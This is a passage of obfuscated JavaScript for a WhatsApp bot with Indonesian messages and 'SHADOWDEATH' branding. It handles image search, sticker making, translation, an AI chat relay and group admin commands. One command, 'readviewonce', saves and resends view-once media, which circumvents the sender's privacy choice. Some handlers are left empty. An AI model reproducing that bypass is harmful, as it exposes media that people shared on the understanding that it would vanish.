            _0x58e9ed += "\n* *ID :* " + _0x188249.id + "\n* *Nama :* " + _0x188249.subject + "\n* *Member :* " + _0x188249.participants.length + "\n* *Status :* " + (_0x188249.announce == false ? "Terbuka" : "Hanya Admin") + "\n* *Pembuat :* " + (_0x188249?.["subjectOwner"] ? _0x188249?.["subjectOwner"]['split']('@')[0x0] : "Sudah Keluar") + "\n";
          }
          return _0x2f6673.reply(_0x58e9ed);
        }
        break;
      case "cekidch":
      case "idch":
        {
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "linkchnya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2.includes("https://whatsapp.com/channel/")) {
            return _0x2f6673.reply("Link tautan tidak valid");
          }
          let _0x139bf1 = _0x1aeaf2.split('https://whatsapp.com/channel/')[0x1];
          let _0x3ff165 = await _0x47285b.newsletterMetadata("invite", _0x139bf1);
          let _0x42c1c8 = "\n* *ID :* " + _0x3ff165.id + "\n* *Nama :* " + _0x3ff165.name + "\n* *Total Pengikut :* " + _0x3ff165.subscribers + "\n* *Status :* " + _0x3ff165.state + "\n* *Verified :* " + (_0x3ff165.verification == "VERIFIED" ? "Terverifikasi" : 'Tidak') + "\n";
          return _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + _0x42c1c8,
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "pin":
      case "pinterest":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "One Piece" + "\n");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🔎',
              'key': _0x2f6673.key
            }
          });
          let _0x444e21 = await pinterest2(_0x1aeaf2);
          if (_0x444e21.length > 0xa) {
            await _0x444e21.splice(0x0, 0xb);
          }
          let _0x4e7221 = new Array();
          for (let _0x3b89d4 of _0x444e21) {
            let _0x388e2d = await prepareWAMessageMedia({
              'image': {
                'url': '' + _0x3b89d4.images_url
              }
            }, {
              'upload': _0x47285b.waUploadToServer
            });
            await _0x4e7221.push({
              'header': proto.Message.InteractiveMessage.Header.fromObject({
                'hasMediaAttachment': true,
                ..._0x388e2d
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0x3b89d4.images_url + "\",\"merchant_url\":\"https://www.google.com\"}"
                }]
              })
            });
          }
          const _0x2b75e2 = await generateWAMessageFromContent(_0x2f6673.chat, {
            'viewOnceMessageV2Extension': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                  'body': proto.Message.InteractiveMessage.Body.fromObject({
                    'text': "\nBerikut adalah foto hasil pencarian dari *pinterest*"
                  }),
                  'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    'cards': _0x4e7221
                  })
                })
              }
            }
          }, {
            'userJid': _0x2f6673.sender,
            'quoted': _0x2f6673
          });
          await _0x47285b.relayMessage(_0x2f6673.chat, _0x2b75e2.message, {
            'messageId': _0x2b75e2.key.id
          });
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case "gimage":
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "logo whatsapp" + "\n");
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🔎',
              'key': _0x2f6673.key
            }
          });
          const _0x4aa6c2 = await fetchJson("https://api.skyzopedia.us.kg/api/search/gimage?q=" + _0x1aeaf2);
          if (!_0x4aa6c2.status) {
            return _0x2f6673.reply("Error");
          }
          let _0x1164a2 = 0x0;
          let _0x52c938;
          if (_0x4aa6c2.result.length < 0x5) {
            _0x52c938 = _0x4aa6c2.result;
          } else {
            _0x52c938 = _0x4aa6c2.result.slice(0x0, 0x5);
          }
          for (let _0x815f59 of _0x52c938) {
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'image': {
                'url': _0x815f59.url
              },
              'caption': "Hasil pencarian foto ke " + (_0x1164a2 += 0x1)
            }, {
              'quoted': _0x2f6673
            });
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '',
              'key': _0x2f6673.key
            }
          });
        }
        break;
      case 'ai':
      case "gpt":
      case "openai":
        {
          let _0x57238a = _0x1aeaf2 ? _0x1aeaf2 : "hai";
          await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Nika-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + _0x57238a).then(async _0x163335 => {
            await _0x2f6673.reply(_0x163335.result);
          })["catch"](_0x4b13b6 => _0x2f6673.reply(_0x4b13b6.toString()));
        }
        break;
      case "brat":
        {
          if (!q) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("*CaraPenggunaan* \n " + ('.' + _0x4345b8) + " Depay"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "𝗪𝗮𝗶𝘁...",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          const _0x40627a = 'https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(q);
          const _0x176de9 = path.join(__dirname, 'temp_image.jpg');
          const _0x55699d = path.join(__dirname, "sticker.webp");
          try {
            const _0x366513 = await axios.get(_0x40627a, {
              'responseType': "arraybuffer"
            });
            fs.writeFileSync(_0x176de9, _0x366513.data);
            exec("ffmpeg -i " + _0x176de9 + " -vf \"scale=512:512:force_original_aspect_ratio=decrease\" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 " + _0x55699d, async _0x4277a8 => {
              if (_0x4277a8) {
                console.error("Gagal mengonversi gambar:", _0x4277a8);
                return await _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': "Gagal membuat stiker",
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'sticker': fs.readFileSync(_0x55699d)
              }, {
                'quoted': _0x2f6673
              });
              fs.unlinkSync(_0x176de9);
              fs.unlinkSync(_0x55699d);
            });
          } catch (_0x4e812b) {
            console.error("Gagal membuat stiker:", _0x4e812b);
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Gagal membuat stiker",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
        }
        break;
      case "bratvid":
      case "bratvideo":
        {
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teksnya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          try {} catch (_0x47200c) {
            console.error("Error:", _0x47200c);
          }
        }
        break;
      case 'qc':
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teksnya" + "\n");
          }
          var _0x2990d2;
          try {
            _0x2990d2 = await _0x47285b.profilePictureUrl(_0x2f6673.sender, "image");
          } catch (_0x2c9ced) {
            _0x2990d2 = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
          }
        }
        break;
      case 's':
      case 'sticker':
      case 'stiker':
        {
          if (!/image|video/gi.test(_0xac161)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan kirim media" + "\n");
          }
          if (/video/gi.test(_0xac161) && _0x13d557.seconds > 0xf) {
            return _0x2f6673.reply("Durasi vidio maksimal 15 detik!");
          }
          var _0x10d4be = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          await _0x47285b.sendAsSticker(_0x2f6673.chat, _0x10d4be, _0x2f6673, {
            'packname': global.packname
          });
          await fs.unlinkSync(_0x10d4be);
        }
        break;
      case "swm":
      case "stickerwm":
      case "stikerwm":
      case 'wm':
        {
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "namamu dengan kirim media" + "\n");
          }
          if (!/image|video/gi.test(_0xac161)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "namamu dengan kirim media" + "\n");
          }
          if (/video/gi.test(_0xac161) && _0x13d557.seconds > 0xf) {
            return _0x2f6673.reply("Durasi vidio maksimal 15 detik!");
          }
          var _0x10d4be = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          await _0x47285b.sendAsSticker(_0x2f6673.chat, _0x10d4be, _0x2f6673, {
            'packname': _0x1aeaf2
          });
          await fs.unlinkSync(_0x10d4be);
        }
        break;
      case 'rvo':
      case 'readviewonce':
        {
          if (!_0x2f6673.quoted) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan reply pesannya" + "\n");
          }
          let _0x1b81a1 = _0x2f6673.quoted.message;
          let _0x4c0c1c = Object.keys(_0x1b81a1)[0x0];
          if (!_0x1b81a1[_0x4c0c1c].viewOnce) {
            return _0x2f6673.reply("Pesan itu bukan viewonce!");
          }
          let _0x3a1dc0 = await downloadContentFromMessage(_0x1b81a1[_0x4c0c1c], _0x4c0c1c == "imageMessage" ? "image" : _0x4c0c1c == "videoMessage" ? "video" : "audio");
          let _0x5956c5 = Buffer.from([]);
          for await (const _0x4f93cc of _0x3a1dc0) {
            _0x5956c5 = Buffer.concat([_0x5956c5, _0x4f93cc]);
          }
          if (/video/.test(_0x4c0c1c)) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'video': _0x5956c5,
              'caption': _0x1b81a1[_0x4c0c1c].caption || ''
            }, {
              'quoted': _0x2f6673
            });
          } else {
            if (/image/.test(_0x4c0c1c)) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'image': _0x5956c5,
                'caption': _0x1b81a1[_0x4c0c1c].caption || ''
              }, {
                'quoted': _0x2f6673
              });
            } else {
              if (/audio/.test(_0x4c0c1c)) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'audio': _0x5956c5,
                  'mimetype': "audio/mpeg",
                  'ptt': true
                }, {
                  'quoted': _0x2f6673
                });
              }
            }
          }
        }
        break;
      case "tourl":
        {
          if (!/image/.test(_0xac161)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan kirim/reply foto" + "\n");
          }
          let _0x2c33ad = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          const {
            ImageUploadService: _0x191bbd
          } = require("node-upload-images");
          const _0x4ca122 = new _0x191bbd("pixhost.to");
          let {
            directLink: _0x500ddb
          } = await _0x4ca122.uploadFromBinary(fs.readFileSync(_0x2c33ad), 'vynx.png');
          let _0x115d17 = _0x500ddb.toString();
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x115d17
          }, {
            'quoted': _0x2f6673
          });
          await fs.unlinkSync(_0x2c33ad);
        }
        break;
      case "tourl2":
        {
          if (!/image/.test(_0xac161)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan kirim/reply foto" + "\n");
          }
          let _0x27a902 = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          const {
            ImageUploadService: _0x22d69e
          } = require("node-upload-images");
          const _0x297d38 = new _0x22d69e("postimages.org");
          let {
            directLink: _0x36952b
          } = await _0x297d38.uploadFromBinary(fs.readFileSync(_0x27a902), 'vynx.png');
          let _0x1ee4a2 = _0x36952b.toString();
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x1ee4a2
          }, {
            'quoted': _0x2f6673
          });
          await fs.unlinkSync(_0x27a902);
        }
        break;
      case 'tr':
      case "translate":
        {
          let _0x905a4b;
          let _0x2126c8;
          if (_0x1aeaf2 || _0x2f6673.quoted) {
            let _0x224238 = require("translate-google-api");
            if (_0x1aeaf2 && !_0x2f6673.quoted) {
              if (_0x3e49e9.length < 0x2) {
                return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "id good night" + "\n");
              }
              _0x905a4b = _0x3e49e9[0x0];
              _0x2126c8 = _0x1aeaf2.split(" ").slice(0x1).join(" ");
            } else {
              if (_0x2f6673.quoted) {
                if (!_0x1aeaf2) {
                  return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "id good night" + "\n");
                }
                if (_0x3e49e9.length < 0x1) {
                  return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "id good night" + "\n");
                }
                if (!_0x2f6673.quoted.text) {
                  return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "id good night" + "\n");
                }
                _0x905a4b = _0x3e49e9[0x0];
                _0x2126c8 = _0x2f6673.quoted.text;
              }
            }
            let _0x285a20;
            try {
              _0x285a20 = await _0x224238('' + _0x2126c8, {
                'to': _0x905a4b
              });
            } catch (_0x51620e) {
              _0x285a20 = await _0x224238('' + _0x2126c8, {
                'to': 'en'
              });
            } finally {
              _0x2f6673.reply(_0x285a20[0x0]);
            }
          } else {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "id good night" + "\n");
          }
        }
        break;
      case 'hd':
        {
          if (!_0xb1b745) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Balas gambar dengan caption " + ('.' + _0x4345b8)),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!/image/.test(_0xac161)) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan kirim/reply foto" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕖',
              'key': _0x2f6673.key
            }
          });
          try {
            const {
              remini: _0x3aca59
            } = require("../library/hd.js");
            let _0x1503a3 = await _0xb1b745.download();
            let _0x167542 = await _0x3aca59(_0x1503a3, "enhance");
            _0x167542 = await _0x3aca59(_0x167542, "enhance");
            _0x167542 = await _0x3aca59(_0x167542, "enhance");
            _0x47285b.sendFile(_0x2f6673.chat, _0x167542, '', "_Sukses Membuat HD 3x Enhance✅_", _0x2f6673);
          } catch (_0x39fa31) {
            console.error(_0x39fa31);
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'react': {
                'text': '❌',
                'key': _0x2f6673.key
              }
            });
          }
        }
        break;
      case "add":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13 && !_0x2f6673.isAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.admin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isBotAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.botAdmin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (_0x1aeaf2) {
            const _0x539cc2 = _0x1aeaf2 ? _0x1aeaf2.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : false;
            var _0x1c7f59 = await _0x47285b.onWhatsApp(_0x539cc2.split('@')[0x0]);
            if (_0x1c7f59.length < 0x1) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Nomor tidak terdaftar di whatsapp",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            const _0x5dc55a = await _0x47285b.groupParticipantsUpdate(_0x2f6673.chat, [_0x539cc2], "add");
            return Object.keys(_0x5dc55a).length == 0x0 ? _0x2f6673.reply("Berhasil Menambahkan " + _0x539cc2.split('@')[0x0] + " Kedalam Grup Ini") : _0x2f6673.reply(JSON.stringify(_0x5dc55a, null, 0x2));
          } else {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + '62838###' + "\n");
          }
        }
        break;
      case "kick":
      case "kik":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13 && !_0x2f6673.isAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.admin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isBotAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.botAdmin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (_0x1aeaf2 || _0x2f6673.quoted) {
            const _0x2e885e = _0x2f6673.mentionedJid[0x0] ? _0x2f6673.mentionedJid[0x0] : _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2 ? _0x1aeaf2.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false;
            var _0x1c7f59 = await _0x47285b.onWhatsApp(_0x2e885e.split('@')[0x0]);
            if (_0x1c7f59.length < 0x1) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Nomor tidak terdaftar di whatsapp",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            await _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Berhasil mengeluarkan " + _0x2e885e.split('@')[0x0] + " dari grup ini"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "@tag/reply" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
        }
        break;
      case "leave":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          await _0x2f6673.reply("Baik, Saya Akan Keluar Dari Grup Ini");
          await sleep(0xfa0);
          await _0x47285b.groupLeave(_0x2f6673.chat);
        }
        break;
      case "resetlinkgc":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isBotAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.botAdmin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          await _0x47285b.groupRevokeInvite(_0x2f6673.chat);
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil mereset link grup ✅",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'tanda':
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x429a13 && !_0x2f6673.isAdmin) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.admin,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
